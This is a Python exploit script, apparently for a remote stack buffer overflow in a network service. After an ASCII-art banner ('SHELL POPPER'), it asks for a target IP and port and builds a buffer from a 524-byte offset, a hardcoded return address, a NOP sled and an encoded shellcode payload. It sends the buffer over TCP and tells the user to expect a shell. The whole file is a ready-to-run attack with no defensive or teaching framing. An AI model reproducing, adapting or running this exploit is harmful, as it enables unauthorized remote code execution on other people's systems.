import subprocess, os, socket, sys, time, string, webbrowser 

subprocess.call('clear', shell=True)
print('\033[1;31m'+"""

                        THE MEIST (SHELL POPPER SCRIPT)"""+'\033[1;m')
print("""
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      FEAR THE M3I$T
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⠿⠟⠛⠻⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣆⣀⣀⠀⣿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠻⣿⣿⣿⠅⠛⠋⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢼⣿⣿⣿⣃⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣟⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣛⣛⣫⡄⠀⢸⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⡆⠸⣿⣿⣿⡷⠂⠨⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⡇⢀⣿⡿⠋⠁⢀⡶⠪⣉⢸⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡏⢸⣿⣷⣿⣿⣷⣦⡙⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣇⢸⣿⣿⣿⣿⣿⣷⣦⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡁⠀⠀
    """) 
print("")
#IP enter
print()
print()
target = input("Enter your target IP address: ")
error = ("Invalid Input")
try:
    t_ip = socket.gethostbyname(target)
except (UnboundLocalError, socket.gaierror):
    print("\n[-]Invalid format. Please use a correct IP address[-]\n")
    sys.exit()
targetport = int(input("Enter your target port number here: "))
error = ("Invalid Input")
ip = target
port = targetport
time.sleep(0)
subprocess.call('clear', shell=True)
input("Press enter to exploit:")

retninput = "\xf3\x12\x17\x31"
print()
time.sleep(2)



payload = ("\xdb\xcf\xbf\x44\xa6\x90\x22\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x31\x7b\x17\x03\x7b\x17\x83\xaf\x5a\x72\xd7\xd3\x4b\xf1"
"\x18\x2b\x8c\x96\x91\xce\xbd\x96\xc6\x9b\xee\x26\x8c\xc9\x02"
"\xcc\xc0\xf9\x91\xa0\xcc\x0e\x11\x0e\x2b\x21\xa2\x23\x0f\x20"
"\x20\x3e\x5c\x82\x19\xf1\x91\xc3\x5e\xec\x58\x91\x37\x7a\xce"
"\x05\x33\x36\xd3\xae\x0f\xd6\x53\x53\xc7\xd9\x72\xc2\x53\x80"
"\x54\xe5\xb0\xb8\xdc\xfd\xd5\x85\x97\x76\x2d\x71\x26\x5e\x7f"
"\x7a\x85\x9f\x4f\x89\xd7\xd8\x68\x72\xa2\x10\x8b\x0f\xb5\xe7"
"\xf1\xcb\x30\xf3\x52\x9f\xe3\xdf\x63\x4c\x75\x94\x68\x39\xf1"
"\xf2\x6c\xbc\xd6\x89\x89\x35\xd9\x5d\x18\x0d\xfe\x79\x40\xd5"
"\x9f\xd8\x2c\xb8\xa0\x3a\x8f\x65\x05\x31\x22\x71\x34\x18\x2b"
"\xb6\x75\xa2\xab\xd0\x0e\xd1\x99\x7f\xa5\x7d\x92\x08\x63\x7a"
"\xd5\x22\xd3\x14\x28\xcd\x24\x3d\xef\x99\x74\x55\xc6\xa1\x1e"
"\xa5\xe7\x77\xb0\xf5\x47\x28\x71\xa5\x27\x98\x19\xaf\xa7\xc7"
"\x3a\xd0\x6d\x60\xd0\x2b\xe6\x4f\x8d\x49\x5f\x27\xcc\xad\x8e"
"\xe4\x59\x4b\xda\x04\x0c\xc4\x73\xbc\x15\x9e\xe2\x41\x80\xdb"
"\x25\xc9\x27\x1c\xeb\x3a\x4d\x0e\x9c\xca\x18\x6c\x0b\xd4\xb6"
"\x18\xd7\x47\x5d\xd8\x9e\x7b\xca\x8f\xf7\x4a\x03\x45\xea\xf5"
"\xbd\x7b\xf7\x60\x85\x3f\x2c\x51\x08\xbe\xa1\xed\x2e\xd0\x7f"
"\xed\x6a\x84\x2f\xb8\x24\x72\x96\x12\x87\x2c\x40\xc8\x41\xb8"
"\x15\x22\x52\xbe\x19\x6f\x24\x5e\xab\xc6\x71\x61\x04\x8f\x75"
"\x1a\x78\x2f\x79\xf1\x38\x4f\x98\xd3\x34\xf8\x05\xb6\xf4\x65"
"\xb6\x6d\x3a\x90\x35\x87\xc3\x67\x25\xe2\xc6\x2c\xe1\x1f\xbb"
"\x3d\x84\x1f\x68\x3d\x8d")


offset = 524
overflow = "A" * offset
#retn = retninput
padding = "\x90" * 16
#payload = ""
buffer = overflow + retninput + padding + payload


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))

    print("Sending bufferness...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Complete.")    
    input("Press Enter to continue You should have a shell:")
  
except:
    print("Failed to connect.")
